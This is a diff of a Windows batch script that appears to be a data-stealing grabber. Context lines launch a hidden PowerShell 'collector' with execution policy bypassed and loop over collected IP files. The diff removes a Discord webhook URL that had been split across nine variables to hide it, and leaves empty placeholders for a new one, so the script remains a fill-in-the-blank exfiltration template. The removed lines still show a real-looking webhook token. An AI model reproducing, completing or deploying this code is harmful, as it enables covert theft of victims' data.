@@ -412,17 +412,17 @@ echo }
 
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%_collectorPS%" >nul 2>&1
 
-set "WH=htt"
-set "WH1=ps://"
-set "WH2=discord.co"
-set "WH3=m/api/webhooks/"
-set "WH4=134624687459"
-set "WH5=5725382/"
-set "WH6=_v4OQjZaLxp-qM-dTip"
-set "WH7=6vAgoMCtr7AP7dAJXVsRTu-wz"
-set "WH8=EKhkeLBtsBhVpRHgMFsAHHiX"
-::Discord webhook here
-set "WEBHOOK_URL=%WH%%WH1%%WH2%%WH3%%WH4%%WH5%%WH6%%WH7%%WH8%" 
+::webhook url here
+set "WH="
+set "WH1="
+set "WH2="
+set "WH3="
+set "WH4="
+set "WH5="
+set "WH6="
+set "WH7="
+set "WH8="
+set "WEBHOOK_URL=" 
 
 :loopMain
 set "_ipFile=%_dataDir%\ip_%random%.txt"
